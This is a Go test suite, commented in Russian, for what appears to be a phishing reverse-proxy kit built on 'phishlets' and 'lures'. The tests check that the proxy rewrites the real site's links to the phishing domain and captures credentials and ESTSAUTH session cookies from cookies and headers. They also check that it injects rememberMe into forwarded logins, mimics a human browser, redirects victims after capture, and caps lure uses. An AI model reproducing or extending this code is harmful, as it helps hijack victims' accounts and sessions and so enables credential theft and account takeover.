package proxy

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/phantom-v2/phantom/core/phishlet"
	"github.com/phantom-v2/phantom/core/session"
	"github.com/phantom-v2/phantom/internal/lures"
)

// Хелпер: стор с одним кастомным фишлетом.
func customStore(t *testing.T, yml string) *phishlet.Store {
	t.Helper()
	st := phishlet.NewStore()
	if _, err := st.UpsertYAML([]byte(yml)); err != nil {
		t.Fatal(err)
	}
	return st
}

const baseYML = `id: t1
version: 2
base_domains: ["p.test"]
proxy_hosts: [{phish_sub: "login", orig_sub: "o", domain: "u.test", is_landing: true}]
auth_tokens: [{domain: ".u.test", keys: [ESTSAUTH]}]
creds_map: [{key: "login", search: "login"}]
lure_path: "/l/t1"
enabled: true
`

func TestRegexFilter(t *testing.T) {
	yml := baseYML + "sub_filters:\n" +
		"  - triggers_on: \"o.u.test\"\n" +
		"    search: \"https://o.u.test/s/(\\\\w+)\"\n" +
		"    replace: \"https://login.p.test/s/$1\"\n" +
		"    mime: [\"text/html\"]\n" +
		"    regex: true\n"
	st := customStore(t, yml)
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = io.WriteString(w, `<a href="https://o.u.test/s/abc123">x</a>`)
	}))
	defer up.Close()
	eng := New(st, session.NewMemory(0), nil)
	eng.SetUpstream(map[string]string{"o.u.test": up.URL})
	req := httptest.NewRequest(http.MethodGet, "http://login.p.test/", nil)
	uaHuman(req)
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)
	if !strings.Contains(rec.Body.String(), "https://login.p.test/s/abc123") {
		t.Fatalf("regex replace failed: %q", rec.Body.String())
	}
}

func TestRegexWhenGate(t *testing.T) {
	yml := baseYML + "sub_filters:\n" +
		"  - triggers_on: \"o.u.test\"\n" +
		"    search: \"o\\\\.u\\\\.test\"\n" +
		"    replace: \"X\"\n" +
		"    mime: [\"text/html\"]\n" +
		"    regex: true\n" +
		"    when: \"marker-never-present\"\n"
	st := customStore(t, yml)
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = io.WriteString(w, `o.u.test here`)
	}))
	defer up.Close()
	eng := New(st, session.NewMemory(0), nil)
	eng.SetUpstream(map[string]string{"o.u.test": up.URL})
	req := httptest.NewRequest(http.MethodGet, "http://login.p.test/", nil)
	uaHuman(req)
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)
	if strings.Contains(rec.Body.String(), "X here") {
		t.Fatalf("when-gate ignored: %q", rec.Body.String())
	}
}

func TestForcePost(t *testing.T) {
	var gotForm, gotJSON string
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		if strings.Contains(r.Header.Get("Content-Type"), "json") {
			gotJSON = string(b)
		} else {
			gotForm = string(b)
		}
		w.WriteHeader(200)
	}))
	defer up.Close()
	yml := baseYML + "force_post:\n" +
		"  - {ctype: form, key: rememberMe, value: \"true\"}\n" +
		"  - {ctype: json, key: rememberMe, value: \"true\"}\n"
	st := customStore(t, yml)
	eng := New(st, session.NewMemory(0), nil)
	eng.SetUpstream(map[string]string{"o.u.test": up.URL})

	req := httptest.NewRequest(http.MethodPost, "http://login.p.test/",
		strings.NewReader("login=a"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	uaHuman(req)
	eng.ServeHTTP(httptest.NewRecorder(), req)
	if !strings.Contains(gotForm, "rememberMe=true") {
		t.Fatalf("form inject: %q", gotForm)
	}
	req2 := httptest.NewRequest(http.MethodPost, "http://login.p.test/",
		strings.NewReader(`{"login":"a"}`))
	req2.Header.Set("Content-Type", "application/json")
	uaHuman(req2)
	eng.ServeHTTP(httptest.NewRecorder(), req2)
	if !strings.Contains(gotJSON, `"rememberMe":"true"`) {
		t.Fatalf("json inject: %q", gotJSON)
	}
}

func TestPostCaptureRedirect(t *testing.T) {
	yml := baseYML + "redirect_url: \"https://o.u.test/welcome\"\n"
	st := customStore(t, yml)
	var n int
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		n++
		if n == 1 {
			// первый хит: отдаем токен в Set-Cookie
			w.Header().Set("Content-Type", "text/html")
			w.Header().Add("Set-Cookie", "ESTSAUTH=abc; Path=/")
			_, _ = io.WriteString(w, `<html><body>ok</body></html>`)
			return
		}
		w.Header().Set("Content-Type", "text/html")
		_, _ = io.WriteString(w, `<html><body>page2</body></html>`)
	}))
	defer up.Close()
	tap := newTap()
	eng := New(st, session.NewMemory(0), tap)
	eng.SetUpstream(map[string]string{"o.u.test": up.URL})

	// хит 1: токен в Set-Cookie -> флаг захвата на сессии
	req := httptest.NewRequest(http.MethodGet, "http://login.p.test/", nil)
	uaHuman(req)
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)
	var sid string
	for _, c := range rec.Result().Cookies() {
		if c.Name == "sid" {
			sid = c.Value
		}
	}
	if sid == "" {
		t.Fatal("no sid")
	}
	if tap.count("capture.token") < 1 {
		t.Fatal("token not captured")
	}
	// хит 2 с той же sid: HTML получает JS-редирект
	req2 := httptest.NewRequest(http.MethodGet, "http://login.p.test/", nil)
	uaHuman(req2)
	req2.AddCookie(&http.Cookie{Name: "sid", Value: sid})
	rec2 := httptest.NewRecorder()
	eng.ServeHTTP(rec2, req2)
	if !strings.Contains(rec2.Body.String(), `location.replace("https://o.u.test/welcome")`) {
		t.Fatalf("no js redirect: %q", rec2.Body.String())
	}
}

func TestHeaderTokenScan(t *testing.T) {
	st := customStore(t, baseYML)
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Header().Set("X-Auth-Token", "ESTSAUTH=hdr123")
		_, _ = io.WriteString(w, `<html></html>`)
	}))
	defer up.Close()
	tap := newTap()
	eng := New(st, session.NewMemory(0), tap)
	eng.SetUpstream(map[string]string{"o.u.test": up.URL})
	req := httptest.NewRequest(http.MethodGet, "http://login.p.test/", nil)
	uaHuman(req)
	eng.ServeHTTP(httptest.NewRecorder(), req)
	if tap.count("capture.token") < 1 {
		t.Fatal("header token missed")
	}
}

func uaHuman(r *http.Request) {
	r.Header.Set("User-Agent", "Mozilla/5.0 Chrome/126")
	r.Header.Set("Accept-Language", "en-US")
	r.Header.Set("Accept", "text/html")
}

func TestLureRedirectOverride(t *testing.T) {
	yml := baseYML + "redirect_url: \"https://o.u.test/phishlet\"\n"
	st := customStore(t, yml)
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = io.WriteString(w, `<html><body>hi</body></html>`)
	}))
	defer up.Close()
	tap := newTap()
	eng := New(st, session.NewMemory(0), tap)
	eng.SetUpstream(map[string]string{"o.u.test": up.URL})
	ls := lures.New()
	ls.Seed("t1", "/l/t1")
	if err := ls.SmartCreate(lures.Smart{Path: "/l/vip", PhishletID: "t1", MaxUses: 10, RedirectURL: "https://o.u.test/lure"}); err != nil {
		t.Fatal(err)
	}
	eng.SetLures(ls)

	get := func(path string) (string, string) {
		req := httptest.NewRequest(http.MethodGet, "http://login.p.test"+path, nil)
		uaHuman(req)
		rec := httptest.NewRecorder()
		eng.ServeHTTP(rec, req)
		var sid string
		for _, c := range rec.Result().Cookies() {
			if c.Name == "sid" {
				sid = c.Value
			}
		}
		return sid, rec.Body.String()
	}
	// хит без токена: редиректа нет
	sid, body := get("/l/t1")
	if sid == "" {
		t.Fatal("no sid")
	}
	if strings.Contains(body, "location.replace") {
		t.Fatal("redirect before capture")
	}
	// симулируем захват токена на сессии
	eng.markCaptured(sid)
	// хит по static lure: phishlet redirect
	_, body2 := getWith(t, eng, "/l/t1", sid)
	if !strings.Contains(body2, `location.replace("https://o.u.test/phishlet")`) {
		t.Fatalf("phishlet redirect missing: %q", body2)
	}
	// хит по smart lure: override побеждает
	_, body3 := getWith(t, eng, "/l/vip", sid)
	if !strings.Contains(body3, `location.replace("https://o.u.test/lure")`) {
		t.Fatalf("lure override missing: %q", body3)
	}
}

func getWith(t *testing.T, eng *Engine, path, sid string) (string, string) {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, "http://login.p.test"+path, nil)
	uaHuman(req)
	req.AddCookie(&http.Cookie{Name: "sid", Value: sid})
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)
	return sid, rec.Body.String()
}

func TestCapTTL(t *testing.T) {
	st := customStore(t, baseYML)
	eng := New(st, nil, nil)
	eng.SetCapTTL(time.Minute)
	eng.markCaptured("s1")
	if !eng.isCaptured("s1") {
		t.Fatal("must be captured")
	}
	if n := eng.CapCount(); n != 1 {
		t.Fatalf("count=%d", n)
	}
	eng.SetCapTTL(time.Nanosecond)
	time.Sleep(5 * time.Millisecond)
	if eng.isCaptured("s1") {
		t.Fatal("must expire")
	}
	if n := eng.CapCount(); n != 0 {
		t.Fatalf("lazy delete failed: %d", n)
	}

	// sweep: 128 distinct-ключей с протухшим ttl схлопываются в 1
	eng2 := New(st, nil, nil)
	eng2.SetCapTTL(time.Nanosecond)
	for i := 0; i < 127; i++ {
		eng2.markCaptured("k" + itoa(i))
	}
	time.Sleep(2 * time.Millisecond)
	eng2.markCaptured("last")
	if n := eng2.CapCount(); n != 1 {
		t.Fatalf("sweep failed: %d", n)
	}
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b [16]byte
	i := len(b)
	for n > 0 {
		i--
		b[i] = byte('0' + n%10)
		n /= 10
	}
	return string(b[i:])
}
